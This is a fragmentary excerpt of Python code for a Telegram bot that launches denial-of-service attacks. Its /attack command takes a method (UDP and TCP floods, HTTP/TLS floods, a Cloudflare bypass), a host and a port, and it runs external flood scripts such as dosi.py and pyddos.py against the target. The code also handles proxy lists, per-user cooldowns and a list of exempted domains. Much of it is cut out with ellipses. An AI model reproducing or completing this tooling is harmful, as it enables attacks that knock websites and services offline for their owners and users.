...
def attack_command(message):
    ...
    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please enter the correct syntax.\Example: /attack + [method] + [host]')
        return
    ...
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        ...
        bot.reply_to(message, f"@{username} Please wait {remaining time} seconds before using the /attack command again.")
        return
    ...
    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Please enter the port as well.\Example: /attack {method} {host} [port]')
        return
    ...
    blocked_domains = [".edu.ir", ".gov.ir", "medu.ir", "dstat", "count123.org"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'HTTP' or method == 'CF-BYPASS' or method == 'HTTPS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"It is not allowed to attack websites with domain name {blocked_domain}")
                return

    if method in [ 'HTTPS', 'TLS', 'GOD', 'BROWSER', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'HTTP']:
        ...
        command = ["python", "dosi.py","browser", host, "443","1000","1000"]
            ...
            if not port.isdigit():
                ...
                return
            command = ["python", "pyddos.py", "-d" , "-p" , host, port, "-t" , "2000 " , "-Pyslow"]
            duration = 120
        ...
        bot.reply_to(message, 'Invalid attack method. Use the /methods command to view the attack method.')
...
def proxy_command(message):
    ...
    if user_id in allowed_users:
        try:
            ...
            bot.reply_to(message, "File not found proxy.txt.")
    else:
...
def code(message):
    ...
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter correct syntax.\Example: /code + [website link]')
        return
...
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter the correct syntax.\Example: /check + [website link]')
        return
...
def get_proxy_info(message):
    ...
    try:
        with open("proxy.txt", "r") as proxy_file:
            ...
            proxy_message = f'10 Minutes Auto Update\Number of Proxies: {proxy_count}\n'
...
def show_uptime(message):
    ...
    bot.reply_to(message, f'Bot Up and Running: {uptime_str}')
